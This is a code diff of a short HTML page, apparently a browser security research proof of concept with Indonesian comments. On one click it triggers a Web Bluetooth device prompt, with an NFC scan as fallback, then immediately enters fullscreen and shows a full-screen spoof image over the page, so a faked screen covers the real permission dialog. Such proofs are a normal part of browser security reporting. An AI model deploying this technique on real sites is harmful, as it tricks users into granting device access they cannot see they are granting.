@@ -1,44 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Security Research - Sync UI Spoof</title>
+    <title>Security UI Test - Permission Priority</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #fff;
-        }         
-        #spoof {
-            width: 100%;
-            height: 100%;
-            display: none;
-            object-fit: cover;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-        }
-        #content {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }         
+        #spoof { width: 100%; height: 100%; display: none; object-fit: cover; position: fixed; z-index: 9999; }
+        #content { display: flex; align-items: center; justify-content: center; height: 100vh; }
     </style>
 </head>  
 <body>
     <img id="spoof" src="spoof.png.jpeg">
-
     <div id="content">
-        <div style="padding: 50px; border: 2px solid #000; cursor: pointer;">
-            <h1>Click to Start Test</h1>
-            <p>(Direct Sync Execution)</p>
+        <div style="padding: 40px; border: 3px solid red; cursor: pointer;">
+            <h1>KLIK UNTUK TEST</h1>
+            <p>Memprioritaskan Dialog Izin</p>
         </div>
     </div>
 
@@ -46,38 +23,35 @@
         window.onclick = async () => {
             const spoofImg = document.getElementById("spoof");
             const mainContent = document.getElementById("content");
-            const elem = document.documentElement;
 
-            // 1. Tampilkan gambar spoof segera (sinkron)
-            spoofImg.style.display = "block";
-            mainContent.style.display = "none";
-
-            // 2. Minta Fullscreen (asinkron tapi tanpa delay buatan)
+            // STRATEGI: Panggil dialog izin TERLEBIH DAHULU sebelum fullscreen
+            // Ini menggunakan "User Gesture" yang sama
             try {
-                if (elem.requestFullscreen) {
-                    await elem.requestFullscreen();
+                // Gunakan Bluetooth atau NFC sebagai pemicu dialog
+                const p1 = navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+                
+                // Segera eksekusi fullscreen saat dialog sedang diproses oleh sistem
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
                 }
-            } catch (err) {
-                console.log("Fullscreen gagal");
-            }
 
-            // 3. Langsung pemicu Dialog Bluetooth
-            try {
-                await navigator.bluetooth.requestDevice({
-                    acceptAllDevices: true
-                });
+                // Ganti UI ke spoof
+                spoofImg.style.display = "block";
+                mainContent.style.display = "none";
+
+                await p1; // Tunggu hasil dialog (jika diperlukan)
             } catch (e) {
-                console.log("Bluetooth dialog dismissed");
-            }
-
-            // 4. Langsung pemicu NFC Scan
-            try {
-                if ('NDEFReader' in window) {
-                    const ndef = new NDEFReader();
-                    await ndef.scan();
+                console.log("Dialog muncul atau diblokir: " + e.name);
+                
+                // Fallback: Jika Bluetooth gagal, langsung coba NFC
+                try {
+                    if ('NDEFReader' in window) {
+                        const ndef = new NDEFReader();
+                        await ndef.scan();
+                    }
+                } catch (err) {
+                    console.log("NFC juga gagal.");
                 }
-            } catch (e) {
-                console.log("NFC failed");
             }
         };
     </script>
